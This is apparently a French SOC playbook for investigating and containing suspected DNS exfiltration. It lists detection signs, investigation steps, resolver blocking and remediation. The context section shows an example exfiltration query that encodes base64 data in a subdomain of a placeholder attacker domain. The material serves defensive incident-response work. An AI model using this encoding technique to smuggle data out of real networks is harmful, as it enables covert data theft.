# Playbook — Exfiltration DNS suspectée

## Déclencheur

Alerte générée sur : volume anormalement élevé de requêtes DNS depuis un poste interne, requêtes vers des sous-domaines longs ou encodés, ou requêtes DNS vers des domaines nouvellement enregistrés.

Sources possibles : DNS resolver logs, SIEM, solution EDR.

## Contexte

Le DNS est rarement filtré ou inspecté en profondeur dans les réseaux d'entreprise. C'est un protocole considéré comme "de l'infrastructure" — nécessaire, discret, rarement surveillé.

Un attaquant déjà implanté peut utiliser le DNS pour exfiltrer des données : les données sont encodées dans les sous-domaines des requêtes DNS, qui traversent le réseau sans déclencher les alertes habituelles sur HTTP ou HTTPS.

```
Exemple de requête d'exfiltration :
aGVsbG8td29ybGQ.attacker-domain.com → "hello-world" encodé en base64 dans le sous-domaine
```

## Investigation

**1. Identifier la source**
- Quel poste ou serveur génère ces requêtes ?
- Depuis quand ? (comparer avec les logs historiques)
- L'utilisateur associé au poste a-t-il signalé quelque chose d'anormal ?

**2. Analyser les requêtes**
- Les sous-domaines sont-ils aléatoires ou encodés (base64, hex) ?
- La longueur des sous-domaines est-elle inhabituelle (> 50 caractères) ?
- Le domaine de destination est-il récent ? (date d'enregistrement < 30 jours)
- Ce domaine apparaît-il dans des listes de réputation malveillante ?

**3. Vérifier l'implant**
- Analyser les processus actifs sur le poste source
- Vérifier les connexions réseau actives (`netstat -ano` ou équivalent)
- Rechercher des processus inhabituels qui initient des requêtes DNS

## Containment

**Si exfiltration confirmée ou fortement suspectée :**
- Isoler le poste du réseau (sans l'éteindre — préserver la mémoire pour analyse forensique)
- Bloquer le domaine DNS de destination au niveau du resolver
- Identifier si d'autres postes communiquent avec le même domaine

**Bloquer au niveau du resolver DNS interne :**
```
Ajouter le domaine en question à la liste de blocage DNS (RPZ ou Pi-hole)
```

## Remédiation

- Mettre en place une surveillance DNS : alertes sur volume anormal et domaines nouvellement enregistrés
- Filtrer les requêtes DNS sortantes via un resolver contrôlé (pas de DNS direct vers Internet depuis les postes)
- Analyser le poste source avec un outil EDR pour identifier et supprimer l'implant
- Réinitialiser les comptes utilisateur associés au poste compromis

## Documentation

Consigner dans le ticket d'incident :
- Poste source, domaines ciblés, timestamps
- Volume de requêtes et caractéristiques anormales observées
- Implant identifié : oui / non / en cours d'analyse
- Actions de containment et remédiation

→ `ioc/exfiltration_dns.md`
